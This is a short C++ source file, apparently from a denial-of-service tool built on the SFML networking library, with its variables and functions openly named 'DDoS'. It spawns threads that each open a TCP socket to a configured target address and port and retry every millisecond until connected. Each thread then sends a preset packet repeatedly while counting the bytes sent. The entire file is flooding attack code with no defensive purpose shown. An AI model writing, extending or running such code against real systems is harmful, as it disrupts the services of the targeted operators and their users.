#include "DDoS.h"

namespace Client
{
	std::vector<sf::TcpSocket*> message_sockets;
	sf::IpAddress ip_address;
	int port;

	int DDoS_thread_count;
	int DDoS_message_count;
	size_t DDoS_message_length;
	sf::Packet DDoS_message;
	std::thread* DDoS_threads;
	std::atomic<bool>* DDoS_threads_atomic_flag;
	sf::Time DDoS_waiting_time;
	std::atomic<size_t> DDoS_total_packet_sended;

	bool start_connecting(int index)
	{
		if (Client::message_sockets[index]->connect(Client::ip_address, Client::port) == sf::Socket::Status::Done)
		{
			return true;
		}
		return false;
	}

	void client_loop(int index)
	{
		Client::DDoS_threads_atomic_flag[index] = true;
		while (Client::start_connecting(index) == false)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(1));
		}
		Client::message_sender(index);
		sf::sleep(Client::DDoS_waiting_time);
		Client::message_sockets[index]->disconnect();
		Client::DDoS_threads_atomic_flag[index] = false;
	}

	void message_sender(int index)
	{
		for (size_t i = 0; i < Client::DDoS_message_count; i++)
		{
			sf::Socket::Status status = Client::message_sockets[index]->send(Client::DDoS_message);
			if (status == sf::Socket::Status::Done)
			{
				Client::DDoS_total_packet_sended += Client::DDoS_message.getDataSize();
			}
		}
	}
}

